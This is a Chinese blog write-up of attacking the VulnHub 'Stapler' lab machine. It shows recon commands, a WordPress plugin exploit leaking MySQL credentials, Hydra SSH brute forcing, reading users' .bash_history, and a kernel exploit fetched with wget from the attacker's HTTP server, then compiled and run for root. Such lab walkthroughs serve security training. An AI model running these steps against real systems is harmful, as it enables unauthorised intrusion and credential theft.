#  vulnhub靶场渗透之Stapler 8000字详解，多种方式任你挑选，sql注入、隧道建立、hadry爆破、内核漏洞利用。   
原创 泷羽Sec-zhao'y  泷羽Sec-朝阳   2025-03-07 19:10  
  
# vulnhub靶场渗透之Stapler 8000字详解，多种方式任你挑选，sql注入、隧道建立、hadry爆破、内核漏洞利用。  
## 一、信息收集  
### 1、首先拿到靶场先扫一下ip  
  
arp-scan -l![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohfnaiakibw5oTCtlQQ112tFcyn4iaW9hhhkRNtOG18EanJzjqW4ctb657w/640?wx_fmt=png&from=appmsg "")  
这次ip总算是正常了，刚才报了个253的c段，人给我干懵了  
### 2、指纹扫描  
```
nmap -sS -sV 192.168.66.178

nmap -p- -sV -A 192.168.66.253

端口服务版本信息
PORT     STATE  SERVICE     VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp         vsftpd 2.0.8 or later
22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp   open   domain      dnsmasq 2.75
80/tcp   open   http        PHP cli server 5.5 or later
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp  open   doom?
3306/tcp open   mysql       MySQL 5.7.12-0ubuntu1

```  
  
这次爆出来一堆端口，我人很眩晕，大概能预感这台靶机不太好打  
  
就在指纹扫描时候爆出了一段代码，可能是我的kali出了问题，也或许是一段线索，![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohSQJoycDzdrcHdjhfasQKmrysr27VjL7KXJ9zO2gKxY93A14AWmHQjw/640?wx_fmt=png&from=appmsg "")  
看着有点像16进制的一段代码，没找到好的方式去破解，我们思路回到ftp![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohiaWlWLl9icPwcX7ciciaxoC6BgqB3d6kDYStHTniau2AF5CvCAOORQAu2Hw/640?wx_fmt=png&from=appmsg "")  
  
### 3、扫描目录  
  
还是喜欢从80端口入手，但是这次按顺序来吧，一个一个端口搜集信息，给了这么多端口，信息量会很大![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohPmexWoAKc3yjx5CmAbbdpiakTUJuG2SN9vSGx4a4PBRSQy3BicJeaDHA/640?wx_fmt=png&from=appmsg "")  
80端口貌似是没什么信息，连接失败，先扫描目录，从别的端口入手  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohiaicYjxdWyKSSbmrbIC8shqTwyPfrT7qGEmmUgbkIxyz50gLSe7su50Q/640?wx_fmt=png&from=appmsg "")  
这里是我们扫出来的目录，我们先看看其他端口，回头再来处理这些目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohVuic3xG1PrnVRAlQvYXunN1vPYExa2AkPZ2CCV9IEceAX7BAu2yISuA/640?wx_fmt=png&from=appmsg "")  
```
dirsearch -u "https://192.168.66.178:12380/"
这里扫一些12380端口

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZoh5l7xTQz8TkOOmJZiaoAUibWjAH2xic6fbzMTJpLbBBzHAxLrTH9OmZnnQ/640?wx_fmt=png&from=appmsg "")  
扫出来一堆文件，我们但是有很多403，我们找成功的看看  
  
枚举smb（很重要） enum4linux -a 192.168.20.152  
#### nikto扫描  
  
下次扫描我要重点使用这个nikto了，我的搜集手段还是太少了，我现在打靶整体流程是形成了雏形，但是攻击手段不够丰富，单纯的拿dirb和dirsearch完全是不够用的  
```
nikto -h 192.168.66.178 -p 12380

```  
### 4、21端口  
```
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.| ftp-syst: |   STAT: | FTP server status:|      Connected to 192.168.66.129|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 2|      vsFTPd 3.0.3 - secure, fast, stable|_End of status
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohicOTQDo0vdmbsdaNAVfQCIXSPBazFws79sb6wsicCvetX42VKpPZ60YQ/640?wx_fmt=png&from=appmsg "")  
经过翻译后我们确切的到有匿名ftp登录，也是被允许了，但是无法获取目录列表，550的权限，也就是其他用户无权限访问。  
  
我们仔细观察一下21端口，因为21端口有一个匿名访问  
  
ftp 192.168.66.178  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohlZsNmDPwrt2BlfmDqdxzsjf55ttogtPXWwd9qKT6ENhmybp8iaeK9nw/640?wx_fmt=png&from=appmsg "")  
这里给我弄得很眩晕，没懂什么意思，有两个用户John和Elly，应该是ssh的账户吧，回到我们爆破目录下  
### 4、12380端口  
```
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Tim, we need to-do better next year for Initech
|_http-server-header: Apache/2.4.18 (Ubuntu)
这里也是http服务

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohldnxrvpcZt9HONFGDCxdQBm9XEaOibspXWqpoXA4tqgnIP1VBR2gd4g/640?wx_fmt=png&from=appmsg "")  
这里貌似有什么信息，我们再找一找![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZoh1ZzATdmswVhtRl4KjpxnqNlAfOtTH8qtsCXvRj1OlJnVdKDZeutCLg/640?wx_fmt=png&from=appmsg "")  
这里貌似有个Tim的用户还有负责人Zoe![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohnI3xBicRbrCgGgCOMSQfZNfvseJYdYrAvDVajicOn0nHKfibAO3Ramo7A/640?wx_fmt=png&from=appmsg "")  
再往下翻进本上确定了这个作者给我们的信息，我们翻译翻译![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohOgFISpJicbVo8yDuxp98NLyDyAK13bJWMRdj8xYQhoaguBo7HmEoddA/640?wx_fmt=png&from=appmsg "")  
okok，这里作者是给了信息，将图像源/images/default.jpg替换成我们喜欢的图像，那我们可以理解图片木马上传，和我昨天做的shell.php.png有点像啊，或者塞一句话木马，但是我们没有找到注入点，我们需要再收集一下信息  
```
<!--  Change the image source '/images/default.jpg' with your favourite image.  -->
将图像源“/images/default.jpg”替换为您喜欢的图像。

<!--  You can change the black color for the filter with those colors: blue, green, red, orange  -->
您可以将过滤器的黑色更改为以下颜色：蓝色、绿色、红色、橙色。

<!--  H1 can have 2 designs: "logo" and "logo cursive"  -->
可以有两种设计：“徽标”和“徽标草书”

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohWxJvmBL8SoQgKGQ2BqTbuhkuLzpkTjqiaEZ8NUYjvB7APzb9IgxUpHw/640?wx_fmt=png&from=appmsg "")  
这里我们的目录扫到了一些文件，  
### 4、寻找注入点  
  
（1）我在想的是可不可以直接上传一个a.php.png文件丢进作者所说的目录下面去，然后我们再访问监听，就像FristiLeaks哪个靶场一个打法，我们尝试  
```
curl -X PUT \
     -H "Content-Type: image/jpeg" \
     --data-binary "@/home/user/images/test.jpg"  \
     -v http://192.168.122.192/1 

```  
  
这里是上传不了的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohmsL9428zoyRYRnYrxiaPRe9RRUIYzuxQCyAfdcSWfeJyEhGkEjYV1Ew/640?wx_fmt=png&from=appmsg "")  
这里访问robots.txt有两个新的目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohOsSwic3B3JdNra1qwQ6VWsfn8viasHFuFOb8CMn8ZelXhrzqSFkKC1tg/640?wx_fmt=png&from=appmsg "")  
看起来是一个wordpress  
```
wpscan --url https://192.168.66.178:12380/blogblog/ --disable-tls-checks --api-token PaWVhkqRqXsFOVwzzahi8Assl1uYaFSA1gqAnFsLgss
检查一下这个网页
–disable-tls-checks #禁用SSL/TLS证书验证。

```  
### 5、寻找exp  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohtuZ36bmV45PurohX01LlhJSBPgCNAltFhCXtuHvibGLaMhZJtmzPgvg/640?wx_fmt=png&from=appmsg "")  
这里找到了有WordPress 4.1-4.2.1的漏洞![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohOaqibspwLQHIJJs45iceafNxYxd5XEPia98Oq8Ma79l6oG9dX7Y4MDscA/640?wx_fmt=png&from=appmsg "")  
我们也找到了一些文件，这里有一些插件信息，我们找到了一个advanced-video的插件，我么找一下相关exp![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohkIqib4xnib2uZm1DN32uH3E3ibgsRV9iaeSiad32yW8iccD8LV53h9jHXsgA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohhpIAzkajCtyzqkNG1lJg8kxZSRpDB8ym3cqdAcb95f2UjxRDj24QBA/640?wx_fmt=png&from=appmsg "")  
这里就这一个，应该是这东西![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohmia9v13tt3tIAma5tDUFslBU8LyPrkkhficJzcicYhSgM8dFicut3szTHw/640?wx_fmt=png&from=appmsg "")  
  
### 6、隧道  
```
ssh爆破
vi user.txt
cat user.txt | cut -d '\' -f2 | cut -d ' ' -f1 >user2.txt

```  
#### 数据库信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohw6Chfhn0qudDGsPTck7j5hqUlOmCLUNSQ6aOOP0cqazsvcaoFMTfpg/640?wx_fmt=png&from=appmsg "")  
跟着提示的poc我们构造一个url，然后这里给了一个url![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohib7ofRiakyvaAb9pW49tN7fWrvxhxlD5T9OhG9xg7Cwe9IJjEmwVe1cQ/640?wx_fmt=png&from=appmsg "")  
然后我们访问url![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohjibDW3RoQl8vmJ7OBLvEaMibSdPxhialtWaick18b0H5yOphTQTHtUt3Uw/640?wx_fmt=png&from=appmsg "")  
然后我们发现uploads里面会多一个jpeg![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohicuc4FlAGAKGNhISBmfoaO3PS63ibJQgqNFYWer0X0mERQCYGc9bQzNw/640?wx_fmt=png&from=appmsg "")  
然后我们把图片下载下来查看一下这个图片  
```
忽略掉证书检查参数为：--no-check-certificate

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohrGpsr7QB5AJhia8PBqbwnEWVuX9TyREPIuM4gTibD3YFffkCq5EKfibeA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohvLFQtunmGhK03BeXHnGu2K8Fqzgh3MF63n8exmHV8t4ia95ex9H4agA/640?wx_fmt=png&from=appmsg "")  
这里我们也是拿到了sql的用户名和密码  
  
登录mysql时候报错，老版本mysql的话禁用ssl就可以了  
```
mysql -h 192.168.66.178 -u root -pplbkac --skip-ssl

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohdmZs5oAWm7gic2N6nq37zcF1lNZbLLfxXZleGAIFa7QmJzWI52AyibJQ/640?wx_fmt=png&from=appmsg "")  
这里其实就已经爆了登录信息![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohQoAtKZTcrGJliclLVtzqAqMnGMibzl59qpsg7zGPibwSO1HRoh4bVJbAw/640?wx_fmt=png&from=appmsg "")  
  
#### Hydra  
  
为什么用这个工具，因为我不熟练，mysql，处处碰壁，最后也是看了很多师傅文章了解到这个靶场爆破会省很多时间  
```
cat 1.jpeg | grep /bin/bash | cut -d ":" -f1 > user.txt
把账户写入user.txt，当作一个用户名字典

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohnRyuG9ktnPe2YRQyJ3ssz25QYbFuL70XXWshjZTVrclbw0WY4ibuycQ/640?wx_fmt=png&from=appmsg "")  
ok，开启hydra，这里我已经受不了了。本来是中午1点左右打的靶场，现在是17：45  
```
hydra 192.168.1.10 ssh -L user.txt -p plbkac
这里hydra会以user.txt作为用户名字典，密码就是plbkac

```  
  
小技巧：文件上锁了就没有执行权了，记得给他赋x权力![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohdhM9k9Rjibx8iajSibNibYibfdR711VCxJdv1bicicwqVdXKvibYSQrPR3h3Sg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohdhM9k9Rjibx8iajSibNibYibfdR711VCxJdv1bicicwqVdXKvibYSQrPR3h3Sg/640?wx_fmt=png&from=appmsg "")  
### 7、提权：  
  
我们爆出来了ssh账户密码，接下来就是提权了，查找具有 Setuid 权限的文件的命令 ls -alhR  
```
查看所有文件夹下的.bash_history文件内容，这段代码非常好用
cat ./*/.bash_history

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohvCSqsplpwbxg4yhjpUAgYiayJeuUiaic4w3c5SeiaBibK1h9ibYpVia2f7RGA/640?wx_fmt=png&from=appmsg "")  
这里爆出了peter的账户密码还有J的登录密码  
#### SHELL1：peter  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohlGq6yHfph2eegpAKO5bxttH6MzZryIq687zGjp7csy8cq6gkAAOWkg/640?wx_fmt=png&from=appmsg "")  
#### SHELL2，wordpress插件上传反弹shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohzKaQfv568vpyOzh1mRtkficyC1am10G5vYpYNbdqADTMQeM0X4kwqTA/640?wx_fmt=png&from=appmsg "")  
我们把数据库中的密码提取出来然后鉴定一下是什么加密  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohnc9oiaSMJGXp6KRQ81v7gP0w6p9WjSByqaCgM2uKFE7sBlPoe5VibTfw/640?wx_fmt=png&from=appmsg "")  
  
MD5加密我们使用john解密即可，只需要自己把密码写入一个txt文本就行了  
```
john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/DC.txt

```  
  
用我们爆出来的密码登录之前的wordpress![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohYulj4gyAC26Wz2iacc1jms2bIaBGAXAnWaibSSGqy8lOy9sHbD5GHqBg/640?wx_fmt=png&from=appmsg "")  
ok，这里做法有很多，这上面一个上传插件![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZoh81mtiaNZTmLTWyyILO9IicALhV0aSnf7Zah2eMwcP0ktC3BD9ibdVooQA/640?wx_fmt=png&from=appmsg "")  
这里就是上传插件然后也是连接到一个ssh，但是这种方法跟数据库有关联，大概是可以用数据库写入一个木马。这种就不演示了  
#### 内核提权  
  
这种方法因该是最简单的  
```
uname -a
lsb_release -a
查看内核版本

hydra -L user2.txt -P user2.txt 192.168.66.178 ssh
这一条就是爆破ssh账户密码了

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZoh1WTxc3o5gwXSiacueeOvj3OdlyNWgjnlFR0KZsia7lpMJrh6R5R3ib5XQ/640?wx_fmt=png&from=appmsg "")  
扫出来了账户和密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohcibFBwMu91bxeNTDaydgp65ngdubnRKdxP305eouoNg2Miadric0Hyt2w/640?wx_fmt=png&from=appmsg "")  
再扫一下版本内核，searchspliot找一下相关exp就可以了  
  
这里是exp使用教程，需要去github或者exp官网下载然后我们继续使用  
```
# Client
# 先下载到一个目录下，然后开启一个简易服务：
python3 -m http.server 8888

# Server 
wget http://192.168.244.133:8888/exploit.tar
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit/
./compile.sh
# 这里有报错，但是一切正常
./doubleput 

```  
  
然后就按照这个流程做就可以了。![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohahF4quibiaSicRlIy7hGGXRlkz87uItmA8ViaaNkVEbDBEDUzsZZUicibicjQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT2gWVicYJxZmogr30cfgdZohwx9u5UuGMcfQMyEF5Uugjaicq2HA12Miblv04OsAsJPiabnDE3MfP59TQ/640?wx_fmt=png&from=appmsg "")  
2025.3.7 PM 19：04  
  
这个靶场知识点非常多，大家做的时候尽量多多尝试、多多报错才会在未来派上用场时候少犯错吧。打靶场这个东西真的是只可意会不可言传，看着靶场解析和打靶场完全是两个东西，而渗透更多也是实战实操的东西，除非走学院科研可能需要理论。希望大家能坚持住，希望我也能坚持住，我真的感觉我最近进步飞快，ok这里是网安大刘感谢观看。  
  
后续我也会出更多打靶文章，希望大家关注！谢谢。  
  
  
